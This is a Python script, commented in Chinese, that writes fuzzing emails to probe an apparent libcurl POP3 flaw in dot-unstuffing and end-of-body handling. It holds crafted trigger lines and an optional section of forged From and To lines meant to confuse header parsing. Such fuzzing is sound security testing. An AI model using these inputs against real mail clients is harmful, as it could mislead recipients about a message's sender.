#!/usr/bin/env python3

"""
CVE-XXXX-YYYY POP3 Fuzz Mail Generator

根据 CVE-XXXX-YYYY_POP3_Header_Risks.md 和 poc.md 的分析，
生成专门用于 fuzz 测试 libcurl POP3 客户端漏洞的邮件文件 (.eml)。

目标：
1.  验证邮件头 (Header) 中的点号转义处理缺失 (Dot-Unstuffing Failure)。
2.  验证邮件头 (Header) 中的 EOB 部分匹配失败导致的数据写入错误。
3.  探索利用这两个漏洞作为“操作原语”进行组合利用的可能性，
    特别是在邮件头区域制造混乱或误导性信息。
"""

import random
import string
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header
import os
import sys

# --- 配置 ---

# 输出文件名
DEFAULT_OUTPUT_FILE = "fuzz_pop3_mail.eml"

# 定义一些常量模式用于触发漏洞
# 模式 A: 用于点号转义处理缺失 (Dot-Unstuffing Failure)
# 邮件头中的值以 . 开头
HEADER_DOT_PATTERN = ".This line starts with a dot (Header dot-unstuffing test)"
# 邮件体中的行以 . 开头
BODY_DOT_PATTERN = ".Hello, this line starts with one dot (Body dot-unstuffing test)."

# 模式 B: 用于 EOB 部分匹配失败 (Incorrect Data Write on EOB Partial Match Failure)
# 在邮件头或体部构造 `\r\n.<X>` 模式，其中 <X> 不是 `\r`。
# 我们使用 `..TriggerBugX` 模式。
# 服务器会 stuff 成 `...TriggerBugX`。
# libcurl 处理时，会匹配 `\r\n.` (eob=3)，然后看到 `T`，匹配失败。
# 补偿逻辑会错误地写入 POP3_EOB 的前 N 个字节。
HEADER_EOB_PATTERN_PREFIX = "..TriggerBugInHeader"
BODY_EOB_PATTERN_PREFIX = "..TriggerBugInBody"

# --- 生成器类 ---

class CVEFuzzMailGenerator:
    """
    生成用于 fuzz 测试 CVE-XXXX-YYYY 漏洞的 POP3 邮件。
    """

    def __init__(self, output_file=DEFAULT_OUTPUT_FILE):
        """
        初始化生成器。
        :param output_file: 输出的 .eml 文件路径。
        """
        self.output_file = output_file
        self.msg = MIMEMultipart()
        # 存储体部内容，以便最后手动构造完整的邮件
        self.body_lines = []
        # 存储需要精确控制的头部行，因为 email 库可能会规范化换行符
        self.custom_headers = []

    def _generate_random_string(self, length=10):
        """生成指定长度的随机字符串。"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def add_standard_headers(self):
        """添加标准的、无害的邮件头部。"""
        self.msg['From'] = f'sender_{self._generate_random_string(5)}@example.com'
        self.msg['To'] = f'recipient_{self._generate_random_string(5)}@example.com'
        self.msg['Subject'] = Header(f'Fuzz Test for CVE-XXXX-YYYY - {self._generate_random_string(10)}', 'utf-8')
        self.msg['Date'] = 'Mon, 01 Jan 2024 12:00:00 +0000'
        self.msg['MIME-Version'] = '1.0'
        self.msg['Content-Type'] = 'text/plain; charset=utf-8'
        self.msg['X-Normal-Header'] = f'For comparison - {self._generate_random_string(15)}'

    def add_vulnerability_headers(self):
        """添加专门用于触发漏洞的头部。"""
        # --- 点号转义处理缺失 (Dot-Unstuffing Failure) ---
        # 添加一个自定义头部，其值以 . 开头。
        # 根据 RFC 1939，服务器会 stuff 成 '..Starts with dot...'
        # 受影响的 libcurl 客户端会接收到 '..Starts with dot...'
        self.custom_headers.append(f"X-Original-Header-Dot: {HEADER_DOT_PATTERN}")

        # --- EOB 部分匹配失败 (Incorrect Data Write on EOB Partial Match Failure) ---
        # 添加一个自定义头部，其值包含 EOB 触发模式。
        # 服务器会 stuff `..TriggerBugInHeader` 成 `...TriggerBugInHeader`。
        # libcurl 处理时，会匹配 `\r\n.` (eob=3)，然后看到 `T`，匹配失败。
        # 补偿逻辑会错误地写入 POP3_EOB 的前 3 (或调整后) 个字节。
        self.custom_headers.append(f"X-EOB-Test-Header: {HEADER_EOB_PATTERN_PREFIX} {self._generate_random_string(10)}")

        # 可以添加更多类似的头部来增加 fuzz 的复杂性
        self.custom_headers.append(f"X-Another-Dot-Header: .Another dot test line.")
        self.custom_headers.append(f"X-Another-EOB-Header: ..AnotherEOBTriggerZ {self._generate_random_string(8)}")

    def add_vulnerability_body(self):
        """添加专门用于触发漏洞的邮件体内容。"""
        self.body_lines.append("This is the body of the fuzz test email.")
        self.body_lines.append("")
        
        # --- 点号转义处理缺失 (Dot-Unstuffing Failure) ---
        # 添加一行以 . 开头的内容。
        # 服务器会 stuff 成 '..Hello...'
        # 受影响的 libcurl 客户端会接收到 '..Hello...'
        self.body_lines.append(BODY_DOT_PATTERN)
        
        # 添加一行以 .. 开头的内容（原始内容）。
        self.body_lines.append("..This line starts with two dots (original content).")
        
        self.body_lines.append("")
        self.body_lines.append("More normal body content.")
        self.body_lines.append("")
        
        # --- EOB 部分匹配失败 (Incorrect Data Write on EOB Partial Match Failure) ---
        # 添加包含 EOB 触发模式的行。
        # 服务器会 stuff `..TriggerBugInBody` 成 `...TriggerBugInBody`。
        # libcurl 处理时，会匹配 `\r\n.` (eob=3)，然后看到 `I`，匹配失败。
        # 补偿逻辑会错误地写入 POP3_EOB 的前 3 (或调整后) 个字节。
        self.body_lines.append(f"{BODY_EOB_PATTERN_PREFIX}{self._generate_random_string(5)}")
        self.body_lines.append("Line after the line that triggers the EOB bug in the body.")
        
        self.body_lines.append("")
        self.body_lines.append("End of the email body.")
        # POP3 EOB
        self.body_lines.append(".")

    def add_chain_reaction_body(self):
        """
        (可选) 添加 `poc.md` 中描述的链式反应模式到体部。
        这是为了测试更复杂的漏洞组合利用。
        """
        self.body_lines.append("")
        self.body_lines.append("--- Chain Reaction Test (from poc.md) ---")
        # 这些行将被服务器 stuff
        # .TriggerSequence -> ..TriggerSequence
        # ..From: ... -> ...From: ...
        self.body_lines.append(".TriggerSequence")
        self.body_lines.append("..From: attacker@example.com.Explode")
        self.body_lines.append("More chain reaction body content.")
        self.body_lines.append(".AnotherTriggerPoint")
        self.body_lines.append("..To: victim@example.com.Mislead")
        self.body_lines.append("End of chain reaction section.")

    def add_random_fuzz_body(self, num_lines=10):
        """
        添加随机生成的体部内容，以增加 fuzz 测试的覆盖面。
        """
        self.body_lines.append("")
        self.body_lines.append("--- Random Fuzz Content ---")
        for _ in range(num_lines):
            line_type = random.choice(['normal', 'dot_start', 'long_line', 'empty_line', 'special_chars'])
            if line_type == 'normal':
                self.body_lines.append(self._generate_random_string(random.randint(10, 50)))
            elif line_type == 'dot_start':
                self.body_lines.append(f".{self._generate_random_string(random.randint(5, 20))}")
            elif line_type == 'long_line':
                self.body_lines.append(self._generate_random_string(random.randint(200, 1000)))
            elif line_type == 'empty_line':
                self.body_lines.append("")
            elif line_type == 'special_chars':
                # 添加一些特殊字符，测试解析器的鲁棒性
                special = ''.join(random.choices(['\t', '\v', '\f', '\x00', '\x01', '\x7f'], k=3))
                self.body_lines.append(f"Special chars line: {special}{self._generate_random_string(10)}")

    def generate(self, include_chain_reaction=False, include_random_fuzz=False, random_fuzz_lines=10):
        """
        生成完整的邮件内容并保存到文件。
        :param include_chain_reaction: 是否包含链式反应测试内容。
        :param include_random_fuzz: 是否包含随机 fuzz 内容。
        :param random_fuzz_lines: 随机 fuzz 内容的行数。
        """
        print(f"[*] Generating fuzz mail for CVE-XXXX-YYYY...")
        print(f"[*] Output file: {self.output_file}")

        # 1. 添加标准头部
        self.add_standard_headers()
        print("[*] Added standard headers.")

        # 2. 添加漏洞测试头部
        self.add_vulnerability_headers()
        print("[*] Added vulnerability-triggering headers.")

        # 3. 构造体部内容
        # 先添加漏洞测试体部
        self.add_vulnerability_body()
        print("[*] Added vulnerability-triggering body lines.")
        
        # 可选：添加链式反应体部
        if include_chain_reaction:
            self.add_chain_reaction_body()
            print("[*] Added chain reaction body lines (from poc.md).")
            
        # 可选：添加随机 fuzz 体部
        if include_random_fuzz:
            self.add_random_fuzz_body(random_fuzz_lines)
            print(f"[*] Added {random_fuzz_lines} lines of random fuzz body content.")

        # 4. 手动构造最终的邮件内容
        # 使用 email 库构建头部和体部的主要部分
        # 但为了精确控制，我们需要手动处理自定义头部和体部的换行符

        # 获取 email 库生成的头部（不包括自定义头部）
        # msg.as_string() 会处理 MIME 和编码，但我们只需要头部字符串
        # 我们可以先添加一个临时的头部来获取标准头部部分
        temp_header_key = "X-Temp-Header-For-Extraction"
        temp_header_val = "This is a temporary header to extract standard headers"
        self.msg[temp_header_key] = temp_header_val
        
        # 获取整个消息的字符串表示
        full_msg_str = self.msg.as_string()
        
        # 找到临时头部的位置，以分割标准头部和体部
        temp_header_line = f"{temp_header_key}: {temp_header_val}"
        header_end_index = full_msg_str.find(temp_header_line)
        if header_end_index == -1:
            # 如果找不到，说明 email 库处理方式有变，我们采用更保守的方法
            # 直接获取不包含 payload 的头部
            headers_str = ""
            for key, val in self.msg.items():
                if key != temp_header_key:
                    headers_str += f"{key}: {val}\r\n"
        else:
            # 提取标准头部部分（包括 MIME 头）
            headers_str = full_msg_str[:header_end_index]
            # 移除可能的尾随 \r\n
            headers_str = headers_str.rstrip('\r\n')
            
        # 移除临时头部行本身
        headers_str = headers_str.replace(f"{temp_header_line}\r\n", "")

        # 构建最终的邮件内容
        final_email_content = ""

        # 添加标准头部
        final_email_content += headers_str
        
        # 添加自定义头部（需要精确的 \r\n）
        for custom_header in self.custom_headers:
            final_email_content += f"{custom_header}\r\n"
            
        # 添加头部和体部的分隔符
        final_email_content += "\r\n" # This will become \r\n\r\n after encoding
        
        # 添加体部内容（需要精确的 \r\n）
        body_content = "\r\n".join(self.body_lines)
        final_email_content += body_content
        # 确保以 \r\n 结尾，符合 RFC
        if not final_email_content.endswith("\r\n"):
            final_email_content += "\r\n"

        # 5. 保存到文件
        # 使用 'wb' 模式和 latin-1 编码来确保 \r\n 不被转换，
        # 并且能处理我们放入的任何字节。
        # 但这对于包含非 ASCII 字符的头部可能有问题。
        # 更好的方法是确保所有内容都是有效的 UTF-8，然后以二进制写入。
        try:
            with open(self.output_file, 'wb') as f:
                # encode with replace to handle any encoding issues gracefully
                f.write(final_email_content.encode('utf-8', errors='replace')) 
            print(f"[+] Fuzz mail successfully saved to '{self.output_file}'")
        except Exception as e:
            print(f"[-] Failed to save mail to file: {e}")
            return False
            
        # 6. 打印生成的邮件摘要
        print("\n--- Generated Mail Summary ---")
        print(f"Standard Headers: {len([k for k in self.msg.keys() if k != temp_header_key])}")
        print(f"Custom Headers: {len(self.custom_headers)}")
        print(f"Body Lines: {len(self.body_lines)}")
        if include_chain_reaction:
            print("  - Includes chain reaction patterns (poc.md).")
        if include_random_fuzz:
            print(f"  - Includes {random_fuzz_lines} lines of random fuzz content.")
        print("--- End of Summary ---\n")
        
        return True

# --- 主函数 ---

def main():
    """主函数，处理命令行参数并调用生成器。"""
    import argparse

    parser = argparse.ArgumentParser(description="Generate a POP3 fuzz mail for CVE-XXXX-YYYY.")
    parser.add_argument("-o", "--output", default=DEFAULT_OUTPUT_FILE, 
                        help=f"Output .eml file path (default: {DEFAULT_OUTPUT_FILE})")
    parser.add_argument("--chain", action="store_true", 
                        help="Include chain reaction patterns from poc.md")
    parser.add_argument("--random", action="store_true", 
                        help="Include random fuzz content in body")
    parser.add_argument("--lines", type=int, default=10, 
                        help="Number of random fuzz lines to add (if --random is used)")

    args = parser.parse_args()

    generator = CVEFuzzMailGenerator(output_file=args.output)
    
    success = generator.generate(
        include_chain_reaction=args.chain,
        include_random_fuzz=args.random,
        random_fuzz_lines=args.lines
    )
    
    if success:
        print("[*] You can now use this file with fuzz_pop3_server.py:")
        print(f"    python fuzz_pop3_server.py {args.output} 8110")
        print("[*] Then connect a POP3 client (e.g., curl) to 127.0.0.1:8110 to test.")
    else:
        print("[-] Mail generation failed.")
        sys.exit(1)

if __name__ == '__main__':
    main()